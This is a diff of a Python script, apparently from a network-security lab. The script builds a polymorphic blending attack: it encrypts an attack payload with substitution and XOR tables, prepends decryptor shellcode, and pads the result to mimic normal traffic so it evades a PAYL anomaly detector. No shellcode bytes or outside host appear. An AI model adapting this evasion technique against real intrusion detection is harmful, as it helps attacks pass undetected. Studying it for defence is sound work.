@@ -57,6 +57,7 @@ def get_size(filename):
     st = os.stat(filename)
     return str(st.st_size)
 
+
 if __name__ == '__main__':
     # Read in source pcap file and extract tcp payload
     attack_payload = getAttackBodyPayload(ATTACKBODY_PATH)
@@ -67,16 +68,15 @@ if __name__ == '__main__':
 
     # Substitution table will be used to encrypt attack body and generate corresponding xor_table which will be used to decrypt the attack body
     (xor_table, adjusted_attack_body) = substitute(attack_payload, substitution_table)
-    # compare_freq(artificial_payload, adjusted_attack_body)
+
     # For xor operation, should be a multiple of 4
-    # CHECK: 128 can be some other number (greater than and multiple of 4) per your attack trace length
-    l = max(get_next_mod_4(xor_table), get_next_mod_4(adjusted_attack_body))
-    while len(xor_table) < l:
+    while len(
+            xor_table) < 128:  # CHECK: 128 can be some other number (greater than and multiple of 4) per your attack trace length
         xor_table.append(chr(0))
 
     # For xor operation, should be a multiple of 4
-    # CHECK: 128 can be some other number (greater than and multiple of 4) per your attack trace length
-    while len(adjusted_attack_body) < l:
+    while len(
+            adjusted_attack_body) < 128:  # CHECK: 128 can be some other number (greater than and multiple of 4) per your attack trace length
         adjusted_attack_body.append(chr(0))
 
     # Read in decryptor binary to append at the start of payload
@@ -87,20 +87,19 @@ if __name__ == '__main__':
     b_list = []
     for b in shellcode_content:
         b_list.append(b)
-    # adjusted_attack_body = ''.join(adjusted_attack_body)
+
     # Raw payload will be constructed by encrypted attack body and xor_table
     raw_payload = b_list + adjusted_attack_body + xor_table
-
     while len(raw_payload) < len(artificial_payload):
         padding(artificial_payload, raw_payload)
 
-    compare_freq(artificial_payload, raw_payload)
-    # print_sub_table(substitution_table)
-    print(len(''.join(raw_payload)), len(''.join(artificial_payload)))
     # Write prepared payload to Output file and test against your PAYL model
-    open('output', 'w')
     with open("output", "w") as result_file:
         result_file.write(''.join(raw_payload))
+
+    open('table.txt', 'w')
+    with open("table.txt", "w") as result_file:
+        result_file.write(str(substitution_table))
 
     open('payload.bin', 'w')
     with open('payload.bin', 'wb') as payload_file:
